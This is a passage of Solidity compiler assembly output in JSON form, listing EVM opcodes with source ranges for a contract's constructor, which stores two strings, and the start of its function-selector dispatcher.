								{
									"begin": 40,
									"end": 55,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "13"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMP",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "tag",
									"source": -1,
									"value": "15"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 12,
									"end": 26,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 649,
									"end": 813,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "1F"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "16"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "tag",
									"source": 0,
									"value": "16"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 754,
									"end": 770,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 740,
									"end": 751,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 740,
									"end": 770,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 740,
									"end": 770,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 740,
									"end": 770,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 740,
									"end": 770,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 740,
									"end": 770,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 740,
									"end": 770,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 740,
									"end": 770,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 740,
									"end": 770,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "19"
								},
								{
									"begin": 740,
									"end": 770,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 740,
									"end": 770,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 740,
									"end": 770,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 740,
									"end": 770,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 740,
									"end": 770,
									"name": "JUMP",
									"source": 0,
									"value": "[in]"
								},
								{
									"begin": 740,
									"end": 770,
									"name": "tag",
									"source": 0,
									"value": "19"
								},
								{
									"begin": 740,
									"end": 770,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 740,
									"end": 770,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 792,
									"end": 806,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 780,
									"end": 789,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 780,
									"end": 806,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 780,
									"end": 806,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 780,
									"end": 806,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 780,
									"end": 806,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 780,
									"end": 806,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 780,
									"end": 806,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 780,
									"end": 806,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 780,
									"end": 806,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "21"
								},
								{
									"begin": 780,
									"end": 806,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 780,
									"end": 806,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 780,
									"end": 806,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 780,
									"end": 806,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 780,
									"end": 806,
									"name": "JUMP",
									"source": 0,
									"value": "[in]"
								},
								{
									"begin": 780,
									"end": 806,
									"name": "tag",
									"source": 0,
									"value": "21"
								},
								{
									"begin": 780,
									"end": 806,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 780,
									"end": 806,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "22"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "tag",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DIV",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "KECCAK256",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "1F"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DIV",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "1F"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "LT",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "24"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "FF"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP6",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "23"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "tag",
									"source": 0,
									"value": "24"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP6",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "23"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "tag",
									"source": 0,
									"value": "25"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "GT",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "26"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "25"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "tag",
									"source": 0,
									"value": "26"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "tag",
									"source": 0,
									"value": "23"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "27"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "28"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMP",
									"source": 0,
									"value": "[in]"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "tag",
									"source": 0,
									"value": "27"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMP",
									"source": 0,
									"value": "[out]"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "tag",
									"source": 0,
									"value": "28"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "29"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "tag",
									"source": 0,
									"value": "30"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "GT",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "31"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "30"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "tag",
									"source": 0,
									"value": "31"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "tag",
									"source": 0,
									"value": "29"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMP",
									"source": 0,
									"value": "[out]"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "tag",
									"source": 0,
									"value": "22"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212204007bec56630b677258ac908ed53977053e3baaba4c545d175dc595c968cf28764736f6c63430006060033",
									".code": [
										{
											"begin": 516,
											"end": 16894,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "PUSH",
											"source": 0,
											"value": "6C02A931"
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "PUSH",
											"source": 0,
											"value": "7B61C320"
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "PUSH",
											"source": 0,
											"value": "BE9A6555"
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "PUSH",
											"source": 0,
											"value": "D4E93292"
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 516,
											"end": 16894,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 539,
											"end": 562,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 539,
											"end": 562,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "9"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "9"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 539,
											"end": 562,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 539,
											"end": 562,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 539,
											"end": 562,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 539,
											"end": 562,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 539,
											"end": 562,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 539,
											"end": 562,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 539,
											"end": 562,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 539,
											"end": 562,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 539,
											"end": 562,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 539,
											"end": 562,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 23,
											"end": 24,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "12"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4",
